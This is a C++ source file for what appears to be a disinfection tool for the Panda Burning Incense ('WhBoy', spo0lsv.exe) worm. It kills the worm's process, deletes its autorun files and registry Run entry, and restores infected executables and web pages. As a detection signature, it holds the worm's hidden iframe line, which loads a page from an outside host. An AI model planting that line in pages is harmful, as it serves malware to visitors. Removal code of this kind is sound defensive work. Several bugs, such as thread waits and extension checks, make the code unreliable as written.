#include "pch.h"
#include "CTool.h"
#include <strsafe.h>
#include <Queue>
#include "Data.h"
using std::vector;
using std::queue;
LONGLONG g_FileNum = 0;
HANDLE g_hMutex = NULL;
HANDLE g_hMutex2 = NULL;
HANDLE g_hMutex3 = NULL;
// 存放盘符
vector<CString> g_Drivers;
// 存放了所有不遍历的文件夹
vector<CString> g_Folder;
// 存放WHBOY标记
CHAR g_PeTab[] = { "WhBoy" };
CString g_WebTab = L"<iframe src=http://www.ac86.cn/66/index.htm width=\"0\" height=\"0\"></iframe>\r\n";

CTool Tool;

CTool::CTool()
{
	m_VirusSize = 0x7531;
	g_hMutex = CreateMutex(NULL, FALSE, L"File");
	g_hMutex2 = CreateMutex(NULL, FALSE, L"File1");
	g_hMutex3 = CreateMutex(NULL, FALSE, L"File2");

}

//******************************************************************************
// 函数名称: GetAllProcess
// 函数说明: 获取所有的进程
// 作    者: lracker
// 时    间: 2019/11/28
// 参    数: vector<PROCESSENTRY32> & ProcessList
// 返 回 值: void
//******************************************************************************
void CTool::GetAllProcess(vector<PROCESSENTRY32>& ProcessList)
{
	// 获取进程快照
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	// 获取第一个进程
	if (!Process32First(hSnapShot, &pe))
		return;
	do 
	{
		ProcessList.push_back(pe);
	} while (Process32Next(hSnapShot,&pe));
}

//******************************************************************************
// 函数名称: TerminateVirusProcess
// 函数说明: 关闭进程
// 作    者: lracker
// 时    间: 2019/11/28
// 参    数: CString ProcessName
// 返 回 值: int 关闭进程个数
//******************************************************************************
int CTool::TerminateVirusProcess(CString ProcessName)
{
	Tool.m_ProcessList.clear();
	// 获取所有的进程
	CTool::GetAllProcess(Tool.m_ProcessList);
	int nCount = 0;
	for (auto& i : Tool.m_ProcessList)
	{
		// 如果进程名为spo0lsv.exe,则关闭它
		if (!wcscmp(i.szExeFile, L"spo0lsv.exe"))
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i.th32ProcessID);
			// 关闭进程
			if (TerminateProcess(hProcess, 0))
			{
				nCount++;
			}
		}
	}
	return nCount;

}

//******************************************************************************
// 函数名称: DeleteAutoSetup
// 函数说明: 遍历磁盘个数，删掉每一个磁盘底下的autorun.inf和setup.exe
// 作    者: lracker
// 时    间: 2019/11/28
// 返 回 值: int
//******************************************************************************
int CTool::DeleteAutoSetup()
{
	int nCount = 0;
	// 判断有多少个有效磁盘，跳过AB盘
	for (WCHAR i = 'C'; i <= 'Z'; i++)
	{
		CString Driver(i);
		Driver += L":\\";
		int Type = GetDriveType(Driver);
		// 判断磁盘类型
		if ((Type == 2) | (Type == 3) | (Type == 4))
		{
			// 删掉磁盘目录下的autorun.inf和setup.exe
			CString AutoRun = Driver + L"autorun.inf";
			CString Setup = Driver + L"setup.exe";
			USES_CONVERSION;
			SetFileAttributes(AutoRun, FILE_ATTRIBUTE_ARCHIVE);
			SetFileAttributes(Setup, FILE_ATTRIBUTE_ARCHIVE);
			if (remove(W2A(AutoRun.GetBuffer())) == 0)
				nCount++;
			if (remove(W2A(Setup.GetBuffer())) == 0)
				nCount++;
		}
	}
	return nCount;
}

//******************************************************************************
// 函数名称: GetAllFile
// 函数说明: 遍历出所有的文件
// 作    者: lracker
// 时    间: 2019/11/28
// 参    数: void
// 返 回 值: void
//******************************************************************************
void CTool::GetFile()
{
	// 获取到盘符
	WaitForSingleObject(g_hMutex2, INFINITE);
	CString szFilePath = g_Drivers.back();
	szFilePath.Append(L":");
	g_Drivers.pop_back();
	ReleaseMutex(g_hMutex2);
	// 根据获取到的盘符开始遍历
	queue<CString> qFolders;
	qFolders.push(szFilePath);
	WIN32_FIND_DATA FindFileData;
	HANDLE hFile = NULL;
	USES_CONVERSION;
	while (qFolders.size() > 0)
	{
		// 开始遍历这个目录
		CString TempFolder = qFolders.front();
		TempFolder.Append(L"\\*.*");
		hFile = FindFirstFile(TempFolder.GetBuffer(), &FindFileData);
		do 
		{
			// 拼接为完整路径
			TempFolder = qFolders.front();
			TempFolder.Append(L"\\");
			TempFolder.Append(FindFileData.cFileName);
			// 判断是不是目录
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				// 判断是不是本级目录或上级目录的名称，是的话则结束本次循环
				if (!lstrcmp(FindFileData.cFileName, L".") || !lstrcmp(FindFileData.cFileName, L".."))
					continue;
				// 压入新的目录
				qFolders.push(TempFolder);
			}
			else
			{
				// 判断以下是不是Desktop_.ini文件
				if (!lstrcmp(FindFileData.cFileName, L"Desktop_.ini"))
				{
					WaitForSingleObject(g_hMutex, INFINITE);
					SetFileAttributes(TempFolder.GetBuffer(), FILE_ATTRIBUTE_ARCHIVE);
					if (remove(W2A(TempFolder.GetBuffer())) == 0)
						g_FileNum++;
					ReleaseMutex(g_hMutex);
					continue;
				}
				// 获取后缀
				CString Suffix = PathFindExtension(FindFileData.cFileName);
				// 如果后缀为exe、scr、pif、com则要查看压入容器中
				if (Suffix.MakeUpper() == L".EXE" || Suffix.MakeUpper() == L".SCR" || Suffix.MakeUpper() == L".PIF" || Suffix.MakeUpper() == L".COM")
				{
					WaitForSingleObject(g_hMutex3, INFINITE);
					Tool.m_PeVector.push_back(TempFolder);
					ReleaseMutex(g_hMutex3);
				}
				// 如果后缀为WEB类型，则压入容器中
				else if (Suffix.MakeUpper() == L".HTM" || Suffix.MakeUpper() == L".HTML" || Suffix.MakeUpper() == L".ASP" || Suffix.MakeUpper() == L".PHP" || Suffix.MakeUpper() == L"JSP" || Suffix.MakeUpper() == L"ASPX")
				{
					WaitForSingleObject(g_hMutex3, INFINITE);
					Tool.m_WebVector.push_back(TempFolder);
					ReleaseMutex(g_hMutex3);
				}
			}
		} while (FindNextFile(hFile, &FindFileData));
		qFolders.pop();
		if (hFile)
		{
			FindClose(hFile);
			hFile = NULL;
		}
	}
}

//******************************************************************************
// 函数名称: ThreadProc
// 函数说明: 线程回调函数，用于遍历磁盘下的所有文件
// 作    者: lracker
// 时    间: 2019/11/28
// 参    数: LPVOID args
// 返 回 值: DWORD CALLBACK
//******************************************************************************
DWORD CALLBACK ThreadProc(LPVOID args)
{
	CTool::GetFile();
	return 0;
}

//******************************************************************************
// 函数名称: GetAllFile
// 函数说明: 遍历出所有磁盘下的文件(除了A盘和B盘)
// 作    者: lracker
// 时    间: 2019/11/28
// 返 回 值: 返回删除的文件个数
//******************************************************************************
int CTool::GetAllFile()
{
	// 存放线程句柄
	HANDLE hThread[24] = {};
	// 首先获取有多少个有效的磁盘,跳过AB盘
	for (WCHAR i = 'C'; i <= 'Z'; i++)
	{
		CString Driver(i);
		Driver += L":\\";
		int Type = GetDriveType(Driver);
		// 判断磁盘类型
		if ((Type == 2) | (Type == 3) | (Type == 4))
			g_Drivers.push_back((CString)i);
	}
	// 文件数目清空
	g_FileNum = 0;
	// 创建线程，多少个硬盘就有多少个线程
	for (int i = 0; i < g_Drivers.size(); i++)
		hThread[i] = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
	// 等待线程结束
	for (int i = 0; i < 4; i++)
		WaitForSingleObject(hThread[i], INFINITE);
	return g_FileNum;
}

//******************************************************************************
// 函数名称: KillVirus
// 函数说明: 删除病毒本体
// 作    者: lracker
// 时    间: 2019/11/28
// 返 回 值: BOOL
//******************************************************************************
BOOL CTool::KillVirus()
{
	// 获取到系统盘
	WCHAR wSystemPath[MAX_PATH];
	GetSystemDirectory(wSystemPath, MAX_PATH);
	CString VirusPath;
	VirusPath.Format(L"%s%s%s", wSystemPath, L"\\drivers\\", L"spo0lsv.exe");
	USES_CONVERSION;
	int nRet = remove(W2A(VirusPath.GetBuffer()));
	if (nRet == 0)
		return TRUE;
	return FALSE;
}

//******************************************************************************
// 函数名称: IsInfect
// 函数说明: 查看内存中是否有WHBOY字符串
// 作    者: lracker
// 时    间: 2019/11/30
// 参    数: LPVOID Buffer
// 参    数: CHAR * WHBOY
// 返 回 值: int 返回下标
//******************************************************************************
int CTool::IsInfect(PCHAR Buffer, PCHAR WHBOY)
{
	for (int i = 0; i < 286; i++)
	{
		if (WHBOY[0] == Buffer[i])
		{
			if (WHBOY[1] == Buffer[i + 1])
			{
				if (WHBOY[2] == Buffer[i + 2])
				{
					if (WHBOY[3] == Buffer[i + 3])
					{
						if (WHBOY[4] == Buffer[i + 4])
						{
							return i;
						}
					}
				}
			}
		}
	}
	return 0;
}

//******************************************************************************
// 函数名称: IsInfect2
// 函数说明: 查看web文件是否被感染的
// 作    者: lracker
// 时    间: 2019/11/30
// 参    数: PCHAR Buffer
// 参    数: PCHAR WHBOY
// 返 回 值: int
//******************************************************************************
BOOL CTool::IsInfect2(PCHAR Buffer)
{
	CString Temp(Buffer);
	if (Temp == g_WebTab)
	{
		return TRUE;
	}
	return FALSE;
}

//******************************************************************************
// 函数名称: FixFile
// 函数说明: 修复文件
// 作    者: lracker
// 时    间: 2019/11/30
// 返 回 值: int
//******************************************************************************
int CTool::FixFile()
{
	HANDLE hPE = NULL;
	HANDLE hPE2 = NULL;
	HANDLE hPE3 = NULL;
	HANDLE hWeb = NULL;
	HANDLE hWeb2 = NULL;
	int nIndex = 0;
	// 开始修复WEB文件
	for (auto& i : Tool.m_WebVector)
	{
		CString Err;
		CString FileName = i.GetBuffer();
		hWeb = CreateFile(FileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		CHAR Buffer[77] = {};
		OVERLAPPED overlap1 = { 0 };
		int nVirFileSize = GetFileSize(hWeb, NULL);
		int nOffset = nVirFileSize - 76;
		overlap1.Offset = nOffset;
		ReadFile(hWeb, Buffer, 76, 0, &overlap1);
		if (!IsInfect2(Buffer))
		{
			if(hWeb)
				CloseHandle(hWeb);
			hWeb = NULL;
			continue;
		}
		PBYTE File = new BYTE[nOffset]();
		overlap1.Offset = 0;
		ReadFile(hWeb, File, nOffset, 0, &overlap1);
		if (hWeb)
		{
			CloseHandle(hWeb);
			hWeb = NULL;
		}
		// 接着把原文件给删掉
		DeleteFile(FileName);
		OVERLAPPED overlap2 = { 0 };
		hWeb2 = CreateFile(FileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hWeb2, File, nOffset, 0, &overlap2);
		delete File;
		if (hWeb2)
		{
			CloseHandle(hWeb2);
			hWeb2 = NULL;
		}
	}
	// 开始遍历PEVector

	for (auto& i : Tool.m_PeVector)
	{
		CString FileName = i.GetBuffer();
		hPE = CreateFile(FileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		CHAR Buffer[286] = {};
		OVERLAPPED overlap1 = { 0 };
		// 1 + 5 + 260 + 1 + 3 + 1 + 3 + 1 + 10 + 1 == 286个字节
		int nVirFileSize = GetFileSize(hPE, NULL);
		int nOffset = nVirFileSize - 286;
		overlap1.Offset = nOffset;
		ReadFile(hPE, Buffer, 286, 0, &overlap1);
		// 2. 如果发现文件没有被感染，则遍历下一个文件
		nIndex = IsInfect(Buffer, g_PeTab);
		if (hPE)
			CloseHandle(hPE);
		hPE = NULL;
		if (nIndex == 0)
			continue;
		// 获取到文件的原来大小
		int FileSize = CTool::GetVirusSize(FileName);
		// 3. 如果被感染了，则开始恢复
		hPE3 = CreateFile(FileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		OVERLAPPED overlap2 = { 0 };
		//int nVirusSize = 0x7531;
//		int FileSize = nVirFileSize - nVirusSize - 286 + nIndex - 1;
		int nVirusSize = nVirFileSize - 286 + nIndex - 1 - FileSize;
		CString Err;
		Err.Format(L"感染文件大小%X", nVirFileSize);
		OutputDebugString(Err);
		Err.Format(L"病毒大小%X", nVirusSize);
		OutputDebugString(Err);
		Err.Format(L"nIndex大小%X", nIndex);
		OutputDebugString(Err);
		Err.Format(L"文件大小%X", FileSize);
		OutputDebugString(Err);
		PBYTE File = new BYTE[FileSize]();
		overlap2.Offset = nVirusSize;
		ReadFile(hPE3, File, FileSize, 0, &overlap2);
		if (hPE3)
		{
			CloseHandle(hPE3);
			hPE = NULL;
		}
		Err.Format(L"%s", File);
		OutputDebugString(Err);
		OutputDebugString(L"读取内容完毕");
		// 接着把原文件给删掉
		DeleteFile(FileName);
		OVERLAPPED overlap3 = { 0 };
		hPE2 = CreateFile(FileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(hPE2, File, FileSize, 0, &overlap3);
		delete File;
		if (hPE2)
		{
			CloseHandle(hPE2);
			hPE2 = NULL;
		}
	}
	return 0;
}

//******************************************************************************
// 函数名称: GetVirusSize
// 函数说明: 获取病毒的大小
// 作    者: lracker
// 时    间: 2019/11/30
// 返 回 值: int
//******************************************************************************
int CTool::GetVirusSize(CString FileName)
{
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	int Size1 = GetFileSize(hFile, NULL);
	int nOffset = Size1 - 12;
	CString Err;
	Err.Format(L"名字%s", FileName.GetBuffer());
	OutputDebugString(Err);
	OVERLAPPED overlap = { 0 };
	overlap.Offset = nOffset;
	BYTE Buffer[12] = {};
	ReadFile(hFile, Buffer, 12, 0, &overlap);
	int j = 0;
	int k = 0;
	for (int i = 0; i < 12; i++)
	{
		if (Buffer[i] == 0x2)
		{
			j = i;
		}
		if (Buffer[i] == 0x1)
		{
			k = i;
		}
	}
	PCHAR Size = new CHAR[k - j]();
	memcpy(Size, Buffer + j + 1, k - j - 1);
	int Size2 = atoi(Size);
	if (hFile)
		CloseHandle(hFile);
	hFile = NULL;
	return Size2;
}

//******************************************************************************
// 函数名称: ChangeRegister
// 函数说明: 修改注册表
// 作    者: lracker
// 时    间: 2019/11/30
// 返 回 值: void
//******************************************************************************
void CTool::ChangeRegister()
{
	char RegRun[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKeyHKCU = NULL;
	LONG lSize = MAXBYTE;
	char cData[MAXBYTE] = { 0 };
	CString Err;
	long lRet = RegOpenKeyA(HKEY_CURRENT_USER, RegRun, &hKeyHKCU);
	if (lRet == ERROR_SUCCESS)
	{
		lRet = RegQueryValueExA(hKeyHKCU, "svcshare", NULL, NULL, (unsigned char*)cData, (unsigned long*)&lSize);
		if (lRet == ERROR_SUCCESS)
		{
			if (lstrcmpA(cData, "C:\\WINDOWS\\system32\\drivers\\spo0lsv.exe") == 0)
			{
				 Err.Format(L"注册表启动项中存在异常启动项\r\n");
			}

			lRet = RegDeleteValueA(hKeyHKCU, "svcshare");
			if (lRet == ERROR_SUCCESS)
			{
				Err.Format(L"删除成功！\r\n");
			}
			else
			{
				 Err.Format(L"删除失败\r\n");
			}
		}
		else
		{
			Err.Format(L"注册表不存在异常启动项\r\n");
		}
		RegCloseKey(hKeyHKCU);
	}
	else
	{
		Err.Format(L"注册表启动项信息读取失败\r\n");
	}
	OutputDebugString(Err);
	// 接下来修复文件的隐藏显示，需要将CheckedValue的值设置为1
	char RegHide[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWAL";
	HKEY hKeyHKLM = NULL;
	DWORD dwFlag = 1;

	long lRetHide = RegOpenKeyA(HKEY_LOCAL_MACHINE, RegHide, &hKeyHKLM);
	if (lRetHide == ERROR_SUCCESS)
	{
		Err.Format(L"检测注册表的文件隐藏选项...\r\n");
		if (ERROR_SUCCESS == RegSetValueExA(
			hKeyHKLM,             //subkey handle  
			"CheckedValue",       //value name  
			0,                    //must be zero  
			REG_DWORD,            //value type  
			(CONST BYTE*) & dwFlag, //pointer to value data  
			4))                   //length of value data
		{
			Err.Format(L"注册表修复完毕！\r\n");
		}
		else
		{
			Err.Format(L"无法恢复注册表的文件隐藏选项\r\n");
		}
	}
	OutputDebugString(Err);
}

